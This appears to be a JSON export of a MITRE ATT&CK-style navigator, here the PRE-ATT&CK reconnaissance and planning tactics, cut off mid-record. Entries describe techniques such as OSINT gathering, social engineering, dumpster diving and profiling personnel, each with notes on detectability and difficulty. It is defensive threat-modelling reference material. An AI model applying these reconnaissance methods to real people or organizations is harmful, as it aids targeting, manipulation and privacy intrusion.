{"categories":[{"id":1,"name":"Pre-ATT&CK","color":"#FFF851","created_at":null,"updated_at":null,"platforms":[]},{"id":2,"name":"Enterprise","color":"#F5E027","created_at":null,"updated_at":null,"platforms":[{"id":1,"name":"Linux"},{"id":2,"name":"macOS"},{"id":3,"name":"Windows"},{"id":8,"name":"AWS"},{"id":7,"name":"GCP"},{"id":6,"name":"Azure"},{"id":9,"name":"SaaS"},{"id":4,"name":"Office 365"},{"id":10,"name":"Android"},{"id":11,"name":"iOS"},{"id":5,"name":"Azure AD"}]},{"id":3,"name":"Mobile","color":null,"created_at":null,"updated_at":null,"platforms":[{"id":10,"name":"Android"},{"id":11,"name":"iOS"}]},{"id":4,"name":"ICS","color":null,"created_at":null,"updated_at":null,"platforms":[]}],"navigator":[{"id":15,"name":"Target Intelligence","tactics":[{"id":4,"name":"Organizational Information Gathering","source_name":"PRE_ATT_organizational-information-gathering","sort_id":0,"external_id":"TA0017","category_id":1,"created_at":"2020-06-26 11:56:00","updated_at":"2020-06-26 11:56:00","pivot":{"framework_stage_id":15,"tactic_id":4},"techniques":[{"id":3,"name":"T1277 - Acquire OSINT data sets and information","sort_id":0,"external_id":"T1277","external_sub_id":null,"old_external_id":"PRE-T1054","old_external_sub_id":null,"tactic_id":4,"description":"<p>Data sets can be anything from Security Exchange Commission (SEC) filings to public phone numbers. Many datasets are now either publicly available for free or can be purchased from a variety of data vendors.  Open source intelligence (OSINT) is intelligence gathered from publicly available sources. This can include both information gathered on-line as well as in the physical world. (Citation: SANSThreatProfile) (Citation: Infosec-osint) (Citation: isight-osint)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"This activity is indistinguishable from legitimate business uses and easy to obtain.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Large quantities of data exists on people, organizations and technologies whether divulged wittingly or collected as part of doing business on the Internet (unbeknownst to the user\/company).  Search engine and database indexing companies continuously mine this information and make it available to anyone who queries for it.","detection":null,"platforms":[]},{"id":45,"name":"T1279 - Conduct social engineering","sort_id":0,"external_id":"T1279","external_sub_id":null,"old_external_id":"PRE-T1056","old_external_sub_id":null,"tactic_id":4,"description":"<p>Social Engineering is the practice of manipulating people in order to get them to divulge information or take an action. (Citation: SEAttackVectors) (Citation: BeachSE2003)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"No technical means to detect an adversary collecting information about a target.  Any detection would be based upon strong OPSEC policy implementation.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Very effective technique for the adversary that does not require any formal training and relies upon finding just one person who exhibits poor judgement.","detection":null,"platforms":[]},{"id":56,"name":"T1284 - Determine 3rd party infrastructure services","sort_id":0,"external_id":"T1284","external_sub_id":null,"old_external_id":"PRE-T1061","old_external_sub_id":null,"tactic_id":4,"description":"<p>A wide variety of cloud, virtual private services, hosting, compute, and storage solutions are available as 3rd party infrastructure services. These services could provide an adversary with another avenue of approach or compromise. (Citation: LUCKYCAT2012) (Citation: Schneier-cloud) (Citation: Computerworld-suppliers)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Adversary searches publicly available sources and may find this information on the 3rd party web site listing new customers\/clients.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Press releases may reveal this information particularly when it is an expected cost savings or improvement for scalability\/reliability.","detection":null,"platforms":[]},{"id":59,"name":"T1285 - Determine centralization of IT management","sort_id":0,"external_id":"T1285","external_sub_id":null,"old_external_id":"PRE-T1062","old_external_sub_id":null,"tactic_id":4,"description":"<p>Determining if a &quot;corporate&quot; help desk exists, the degree of access and control it has, and whether there are &quot;edge&quot; units that may have different support processes and standards. (Citation: SANSCentratlizeManagement)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"No technical means to detect an adversary collecting information about a target.  Any detection would be based upon strong OPSEC policy implementation.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Requires an adversary to undergo a research process to learn the internal workings of an organization.  An adversary can do this by social engineering individuals in the company by claiming to need to find information for the help desk, or through social engineering of former employees or business partners.","detection":null,"platforms":[]},{"id":65,"name":"T1282 - Determine physical locations","sort_id":0,"external_id":"T1282","external_sub_id":null,"old_external_id":"PRE-T1059","old_external_sub_id":null,"tactic_id":4,"description":"<p>Physical locality information may be used by an adversary to shape social engineering attempts (language, culture, events, weather, etc.) or to plan for physical actions such as dumpster diving or attempting to access a facility. (Citation: RSA-APTRecon)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Adversary searches publicly available sources that list physical locations that cannot be monitored by a defender or are not necessarily monitored (e.g., all IP addresses touching their public web space listing physical locations).","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Most corporations now list their locations on public facing websites.  Some challenge still exists to find covert or sensitive locations.","detection":null,"platforms":[]},{"id":75,"name":"T1286 - Dumpster dive","sort_id":0,"external_id":"T1286","external_sub_id":null,"old_external_id":"PRE-T1063","old_external_sub_id":null,"tactic_id":4,"description":"<p>Dumpster diving is looking through waste for information on technology, people, and\/or organizational items of interest. (Citation: FriedDumpsters)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Yes","detectable_by_common_defenses_explanation":"Strong physical security and monitoring will detect this behavior if performed on premises.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Not difficult if waste is placed in an unsecured or minimally secured area before collection.","detection":null,"platforms":[]},{"id":87,"name":"T1280 - Identify business processes\/tempo","sort_id":0,"external_id":"T1280","external_sub_id":null,"old_external_id":"PRE-T1057","old_external_sub_id":null,"tactic_id":4,"description":"<p>Understanding an organizations business processes and tempo may allow an adversary to more effectively craft social engineering attempts or to better hide technical actions, such as those that generate network traffic. (Citation: Scasny2015) (Citation: Infosec-osint)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Current or previous employees may divulge information on the Internet.  If insiders are used, the defender may have policies or tools in place to detect loss of this data or knowledge.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"In some cases, this requires some insider knowledge or specialized access to learn when critical operations occur in a corporation.  For publicly traded US corporations, there is a lot of open source information about their financial reporting obligations (per SEC).  Companies announce their annual shareholder meeting and their quarter phone calls with investors.  Information such as this can help the adversary to glean certain aspects of the business processes and\/or rhythm.","detection":null,"platforms":[]},{"id":89,"name":"T1283 - Identify business relationships","sort_id":0,"external_id":"T1283","external_sub_id":null,"old_external_id":"PRE-T1060","old_external_sub_id":null,"tactic_id":4,"description":"<p>Business relationship information may be used by an adversary to shape social engineering attempts (exploiting who a target expects to hear from) or to plan for technical actions such as exploiting network trust relationship. (Citation: 11StepsAttackers)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Exception to the rule is if the adversary tips off the target that others have been asking about the relationship with them.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Requires an intensive process.  In some industries, business relationships may be public in order to generate business, but this is not the case for all industries and all relationships.","detection":null,"platforms":[]},{"id":93,"name":"T1278 - Identify job postings and needs\/gaps","sort_id":0,"external_id":"T1278","external_sub_id":null,"old_external_id":"PRE-T1055","old_external_sub_id":null,"tactic_id":4,"description":"<p>Job postings, on either company sites, or in other forums, provide information on organizational structure, needs, and gaps in an organization. This may give an adversary an indication of weakness in an organization (such as under-resourced IT shop). Job postings can also provide information on an organizations structure which could be valuable in social engineering attempts. (Citation: JobPostingThreat) (Citation: RSA-APTRecon)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Public source external to the defender's organization.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Very public by design.","detection":null,"platforms":[]},{"id":100,"name":"T1276 - Identify supply chains","sort_id":0,"external_id":"T1276","external_sub_id":null,"old_external_id":"PRE-T1053","old_external_sub_id":null,"tactic_id":4,"description":"<p>Supply chains include the people, processes, and technologies used to move a product or service from a supplier to a consumer. Understanding supply chains may provide an adversary with opportunities to exploit organizational relationships. (Citation: SmithSupplyChain) (Citation: CERT-UKSupplyChain)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Searching publicly available sources that cannot be monitored by a defender.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"Requires an intensive process.  May be easier in certain industries where there are a limited number of suppliers (e.g., SCADA).","detection":null,"platforms":[]},{"id":122,"name":"T1281 - Obtain templates\/branding materials","sort_id":0,"external_id":"T1281","external_sub_id":null,"old_external_id":"PRE-T1058","old_external_sub_id":null,"tactic_id":4,"description":"<p>Templates and branding materials may be used by an adversary to add authenticity to social engineering message. (Citation: Scasny2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Adversary may download templates or branding from publicly available presentations that the defender can't monitor.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Some branding information is publicly available when a corporation publishes their briefings to the internet which provides insight into branding information and template materials.  An exhaustive list of templating and branding is likely not available on the internet.","detection":null,"platforms":[]}]},{"id":6,"name":"People Information Gathering","source_name":"PRE_ATT_people-information-gathering","sort_id":0,"external_id":"TA0016","category_id":1,"created_at":"2020-06-26 11:56:00","updated_at":"2020-06-26 11:56:00","pivot":{"framework_stage_id":15,"tactic_id":6},"techniques":[{"id":1,"name":"T1266 - Acquire OSINT data sets and information","sort_id":0,"external_id":"T1266","external_sub_id":null,"old_external_id":"PRE-T1043","old_external_sub_id":null,"tactic_id":6,"description":"<p>Open source intelligence (OSINT) provides free, readily available information about a target while providing the target no indication they are of interest.  Such information can assist an adversary in crafting a successful approach for compromise. (Citation: RSA-APTRecon)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:17","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"This activity is indistinguishable from legitimate business uses and easy to obtain.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Possible to gather digital intelligence about a person is easily aided by social networking sites, free\/for fee people search engines, and publicly available information (e.g., county databases on tickets\/DUIs).","detection":null,"platforms":[]},{"id":10,"name":"T1275 - Aggregate individual's digital footprint","sort_id":0,"external_id":"T1275","external_sub_id":null,"old_external_id":"PRE-T1052","old_external_sub_id":null,"tactic_id":6,"description":"<p>In addition to a target's social media presence may exist a larger digital footprint, such as accounts and credentials on e-commerce sites or usernames and logins for email.  An adversary familiar with a target's username can mine to determine the target's larger digital footprint via publicly available sources. (Citation: DigitalFootprint) (Citation: trendmicro-vtech)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Searching publicly available sources that cannot be monitored by a defender.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Information readily available through searches","detection":null,"platforms":[]},{"id":46,"name":"T1268 - Conduct social engineering","sort_id":0,"external_id":"T1268","external_sub_id":null,"old_external_id":"PRE-T1045","old_external_sub_id":null,"tactic_id":6,"description":"<p>Social Engineering is the practice of manipulating people in order to get them to divulge information or take an action. (Citation: SEAttackVectors) (Citation: BeachSE2003)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"No technical means to detect an adversary collecting information about a target.  Any detection would be based upon strong OPSEC policy implementation.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Very effective technique for the adversary that does not require any formal training and relies upon finding just one person who exhibits poor judgement.","detection":null,"platforms":[]},{"id":88,"name":"T1272 - Identify business relationships","sort_id":0,"external_id":"T1272","external_sub_id":null,"old_external_id":"PRE-T1049","old_external_sub_id":null,"tactic_id":6,"description":"<p>Business relationship information includes the associates of a target and may be discovered via social media sites such as <a href=\"https:\/\/www.linkedin.com\">LinkedIn<\/a> or public press releases announcing new partnerships between organizations or people (such as key hire announcements in industry articles).  This information may be used by an adversary to shape social engineering attempts (exploiting who a target expects to hear from) or to plan for technical actions such as exploiting network trust relationship. (Citation: RSA-APTRecon) (Citation: Scasny2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Searching publicly available sources that cannot be monitored by a defender.  Much of this information is widely known and difficult to obscure.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Made easier by today's current social media.","detection":null,"platforms":[]},{"id":91,"name":"T1270 - Identify groups\/roles","sort_id":0,"external_id":"T1270","external_sub_id":null,"old_external_id":"PRE-T1047","old_external_sub_id":null,"tactic_id":6,"description":"<p>Personnel internally to a company may belong to a group or maintain a role with  electronic specialized access, authorities, or privilege that make them an attractive target for an adversary.  One example of this is a system administrator. (Citation: RSA-APTRecon)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Searching publicly available sources that cannot be monitored by a defender.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"Requires an adversary to undergo an intensive research process.  It is resource intensive or requires special data access.  May be easier for certain specialty use cases.","detection":null,"platforms":[]},{"id":94,"name":"T1267 - Identify job postings and needs\/gaps","sort_id":0,"external_id":"T1267","external_sub_id":null,"old_external_id":"PRE-T1044","old_external_sub_id":null,"tactic_id":6,"description":"<p>Job postings, on either company sites, or in other forums, provide information on organizational structure and often provide contact information for someone within the organization. This may give an adversary  information on people within the organization which could be valuable in social engineering attempts. (Citation: JobPostingThreat)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Public source external to the defender's organization.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Very public by design.","detection":null,"platforms":[]},{"id":95,"name":"T1269 - Identify people of interest","sort_id":0,"external_id":"T1269","external_sub_id":null,"old_external_id":"PRE-T1046","old_external_sub_id":null,"tactic_id":6,"description":"<p>The attempt to identify people of interest or with an inherent weakness for direct or indirect targeting to determine an approach to compromise a person or organization.  Such targets may include individuals with poor OPSEC practices or those who have a trusted relationship with the intended target. (Citation: RSA-APTRecon) (Citation: Scasny2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Common defenses protecting against poor OPSEC practices are traditionally more policy-based in nature rather than technical.  Policy-based mitigations are generally more difficult to enforce and track violations, making it more difficult that this technique can be detected by common defenses.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Specialty cases enable an adversary to use key words in order to search social media and identify personnel with poor OPSEC practices who may have access to specialized information which would make them a target of interest.  In addition, the open nature of social media leads to a tendency among individuals to overshare, encouraging poor OPSEC and increasing the ease by which an adversary can identify interesting targets.","detection":null,"platforms":[]},{"id":96,"name":"T1271 - Identify personnel with an authority\/privilege","sort_id":0,"external_id":"T1271","external_sub_id":null,"old_external_id":"PRE-T1048","old_external_sub_id":null,"tactic_id":6,"description":"<p>Personnel internally to a company may have non-electronic specialized access, authorities, or privilege that make them an attractive target for an adversary.  One example of this is an individual with financial authority to authorize large transactions.  An adversary who compromises this individual might be able to subvert large dollar transfers. (Citation: RSA-APTRecon)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"The layers of data required and potential gaps of information to map a specific person to an authority or privilege on a network requires access to resources that may not tip off a defender.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"Requires an adversary to undergo an intensive research process.  It is resource intensive or requires special data access.  May be easier for certain specialty use cases.","detection":null,"platforms":[]},{"id":99,"name":"T1274 - Identify sensitive personnel information","sort_id":0,"external_id":"T1274","external_sub_id":null,"old_external_id":"PRE-T1051","old_external_sub_id":null,"tactic_id":6,"description":"<p>An adversary may identify sensitive personnel information not typically posted on a social media site, such as address, marital status, financial history, and law enforcement infractions. This could be conducted by searching public records that are frequently available for free or at a low cost online. (Citation: RSA-APTRecon)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Searching publicly available sources that cannot be monitored by a defender.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"This type of information is useful to understand the individual and their ability to be blackmailed.  Searching public records is easy and most information can be purchased for a low cost if the adversary really wants it.","detection":null,"platforms":[]},{"id":102,"name":"T1265 - Identify supply chains","sort_id":0,"external_id":"T1265","external_sub_id":null,"old_external_id":"PRE-T1042","old_external_sub_id":null,"tactic_id":6,"description":"<p>Supply chains include the people, processes, and technologies used to move a product or service from a supplier to a consumer. Understanding supply chains may provide an adversary with opportunities to exploit the people, their positions, and relationships, that are part of the supply chain. (Citation: SmithSupplyChain) (Citation: CERT-UKSupplyChain)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Searching publicly available sources that cannot be monitored by a defender.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"Requires an intensive process to obtain the full picture.  It is possible to obtain basic information\/some aspects via OSINT.  May be easier in certain industries where there are a limited number of suppliers (e.g., SCADA).","detection":null,"platforms":[]},{"id":108,"name":"T1273 - Mine social media","sort_id":0,"external_id":"T1273","external_sub_id":null,"old_external_id":"PRE-T1050","old_external_sub_id":null,"tactic_id":6,"description":"<p>An adversary may research available open source information about a target commonly found on social media sites such as <a href=\"https:\/\/www.facebook.com\">Facebook<\/a>, <a href=\"https:\/\/www.instagram.com\">Instagram<\/a>, or <a href=\"https:\/\/www.pinterest.com\">Pinterest<\/a>.  Social media is public by design and provides insight into the interests and potentially inherent weaknesses of a target for exploitation by the adversary. (Citation: RSA-APTRecon)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Searching publicly available sources that cannot be monitored by a defender.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Very public by design.  Application of privacy settings is not a panacea.","detection":null,"platforms":[]}]},{"id":9,"name":"Priority Definition Direction","source_name":"PRE_ATT_priority-definition-direction","sort_id":0,"external_id":"TA0013","category_id":1,"created_at":"2020-06-26 11:56:00","updated_at":"2020-06-26 11:56:00","pivot":{"framework_stage_id":15,"tactic_id":9},"techniques":[{"id":29,"name":"T1238 - Assign KITs, KIQs, and\/or intelligence requirements","sort_id":0,"external_id":"T1238","external_sub_id":null,"old_external_id":"PRE-T1015","old_external_sub_id":null,"tactic_id":9,"description":"<p>Once generated, Key Intelligence Topics (KITs), Key Intelligence Questions (KIQs), and\/or intelligence requirements are assigned to applicable agencies and\/or personnel. For example, an adversary may decide nuclear energy requirements should be assigned to a specific organization based on their mission. (Citation: AnalystsAndPolicymaking) (Citation: JP2-01)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  Few agencies and commercial organizations may have unique insights.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Normal aspect of adversary planning lifecycle.  May not be done by all adversaries.","detection":null,"platforms":[]},{"id":129,"name":"T1239 - Receive KITs\/KIQs and determine requirements","sort_id":0,"external_id":"T1239","external_sub_id":null,"old_external_id":"PRE-T1016","old_external_sub_id":null,"tactic_id":9,"description":"<p>Applicable agencies and\/or personnel receive intelligence requirements and evaluate them to determine sub-requirements related to topics, questions, or requirements.  For example, an adversary's  nuclear energy requirements may be further divided into nuclear facilities versus nuclear warhead capabilities. (Citation: AnalystsAndPolicymaking)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  Few agencies and commercial organizations may have unique insights.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Normal aspect of adversary planning lifecycle.  May not be done by all adversaries.","detection":null,"platforms":[]},{"id":140,"name":"T1237 - Submit KITs, KIQs, and intelligence requirements","sort_id":0,"external_id":"T1237","external_sub_id":null,"old_external_id":"PRE-T1014","old_external_sub_id":null,"tactic_id":9,"description":"<p>Once they have been created, intelligence requirements, Key Intelligence Topics (KITs), and Key Intelligence Questions (KIQs) are submitted into a central management system. (Citation: ICD204) (Citation: KIT-Herring)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  Few agencies and commercial organizations may have unique insights.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Normal aspect of adversary planning lifecycle.  May not be done by all adversaries.","detection":null,"platforms":[]},{"id":141,"name":"T1240 - Task requirements","sort_id":0,"external_id":"T1240","external_sub_id":null,"old_external_id":"PRE-T1017","old_external_sub_id":null,"tactic_id":9,"description":"<p>Once divided into the most granular parts, analysts work with collection managers to task the collection management system with requirements and sub-requirements. (Citation: Heffter) (Citation: JP2-01)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  Few agencies and commercial organizations may have unique insights.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Normal aspect of adversary planning lifecycle.  May not be done by all adversaries.","detection":null,"platforms":[]}]},{"id":10,"name":"Priority Definition Planning","source_name":"PRE_ATT_priority-definition-planning","sort_id":0,"external_id":"TA0012","category_id":1,"created_at":"2020-06-26 11:56:00","updated_at":"2020-06-26 11:56:00","pivot":{"framework_stage_id":15,"tactic_id":10},"techniques":[{"id":22,"name":"T1229 - Assess KITs\/KIQs benefits","sort_id":0,"external_id":"T1229","external_sub_id":null,"old_external_id":"PRE-T1006","old_external_sub_id":null,"tactic_id":10,"description":"<p>Key Intelligence Topics (KITs) and Key Intelligence Questions (KIQs) may be further subdivided to focus on political, economic, diplomatic, military, financial, or intellectual property categories.  An adversary may specify KITs or KIQs in this manner in order to understand how the information they are pursuing can have multiple uses and to consider all aspects of the types of information they need to target for a particular purpose. (Citation: CompetitiveIntelligence) (Citation: CompetitiveIntelligence)KIT.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  Few agencies and commercial organizations may have unique insights.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Normal aspect of adversary planning lifecycle.  May not be done by all adversaries.","detection":null,"platforms":[]},{"id":23,"name":"T1236 - Assess current holdings, needs, and wants","sort_id":0,"external_id":"T1236","external_sub_id":null,"old_external_id":"PRE-T1013","old_external_sub_id":null,"tactic_id":10,"description":"<p>Analysts assess current information available against requirements that outline needs and wants as part of the research baselining process to begin satisfying a requirement. (Citation: CyberAdvertisingChar) (Citation: CIATradecraft) (Citation: ForensicAdversaryModeling) (Citation: CyberAdversaryBehavior)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  Few agencies and commercial organizations may have unique insights.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Normal aspect of adversary planning lifecycle.  May not be done by all adversaries.","detection":null,"platforms":[]},{"id":24,"name":"T1224 - Assess leadership areas of interest","sort_id":0,"external_id":"T1224","external_sub_id":null,"old_external_id":"PRE-T1001","old_external_sub_id":null,"tactic_id":10,"description":"<p>Leadership assesses the areas of most interest to them and generates Key Intelligence Topics (KIT) or Key Intelligence Questions (KIQ). For example, an adversary knows from open and closed source reporting that cyber is of interest, resulting in it being a KIT. (Citation: ODNIIntegration)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  Few agencies and commercial organizations may have unique insights.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Normal aspect of adversary planning lifecycle.  May not be done by all adversaries.","detection":null,"platforms":[]},{"id":30,"name":"T1228 - Assign KITs\/KIQs into categories","sort_id":0,"external_id":"T1228","external_sub_id":null,"old_external_id":"PRE-T1005","old_external_sub_id":null,"tactic_id":10,"description":"<p>Leadership organizes Key Intelligence Topics (KITs) and Key Intelligence Questions (KIQs) into three types of categories and creates more if necessary.  An example of a description of key players KIT would be when an adversary assesses the cyber defensive capabilities of a nation-state threat actor. (Citation: Herring1999)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  Few agencies and commercial organizations may have unique insights.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Normal aspect of adversary planning lifecycle.  May not be done by all adversaries.","detection":null,"platforms":[]},{"id":43,"name":"T1226 - Conduct cost\/benefit analysis","sort_id":0,"external_id":"T1226","external_sub_id":null,"old_external_id":"PRE-T1003","old_external_sub_id":null,"tactic_id":10,"description":"<p>Leadership conducts a cost\/benefit analysis that generates a compelling need for information gathering which triggers a Key Intelligence Toptic (KIT) or Key Intelligence Question (KIQ). For example, an adversary compares the cost of cyber intrusions with the expected benefits from increased intelligence collection on cyber adversaries. (Citation: LowenthalCh4) (Citation: KIT-Herring)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  Few agencies and commercial organizations may have unique insights.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Normal aspect of adversary planning lifecycle.  May not be done by all adversaries.","detection":null,"platforms":[]},{"id":50,"name":"T1232 - Create implementation plan","sort_id":0,"external_id":"T1232","external_sub_id":null,"old_external_id":"PRE-T1009","old_external_sub_id":null,"tactic_id":10,"description":"<p>Implementation plans specify how the goals of the strategic plan will be executed. (Citation: ChinaCollectionPlan) (Citation: OrderOfBattle)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  Few agencies and commercial organizations may have unique insights.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Normal aspect of adversary planning lifecycle.  May not be done by all adversaries.","detection":null,"platforms":[]},{"id":52,"name":"T1231 - Create strategic plan","sort_id":0,"external_id":"T1231","external_sub_id":null,"old_external_id":"PRE-T1008","old_external_sub_id":null,"tactic_id":10,"description":"<p>Strategic plans outline the mission, vision, and goals for an adversary at a high level in relation to the key partners, topics, and functions the adversary carries out. (Citation: KPMGChina5Year) (Citation: China5YearPlans) (Citation: ChinaUN)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  Few agencies and commercial organizations may have unique insights.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Normal aspect of adversary planning lifecycle.  May not be done by all adversaries.","detection":null,"platforms":[]},{"id":55,"name":"T1230 - Derive intelligence requirements","sort_id":0,"external_id":"T1230","external_sub_id":null,"old_external_id":"PRE-T1007","old_external_sub_id":null,"tactic_id":10,"description":"<p>Leadership or key decision makers may derive specific intelligence requirements from Key Intelligence Topics (KITs) or Key Intelligence Questions (KIQs).  Specific intelligence requirements assist analysts in gathering information to establish a baseline of information about a topic or question and collection managers to clarify the types of information that should be collected to satisfy the requirement. (Citation: LowenthalCh4) (Citation: Heffter)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  Few agencies and commercial organizations may have unique insights.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Normal aspect of adversary planning lifecycle.  May not be done by all adversaries.","detection":null,"platforms":[]},{"id":68,"name":"T1227 - Develop KITs\/KIQs","sort_id":0,"external_id":"T1227","external_sub_id":null,"old_external_id":"PRE-T1004","old_external_sub_id":null,"tactic_id":10,"description":"<p>Leadership derives Key Intelligence Topics (KITs) and Key Intelligence Questions (KIQs) from the areas of most interest to them.  KITs are an expression of management's intelligence needs with respect to early warning, 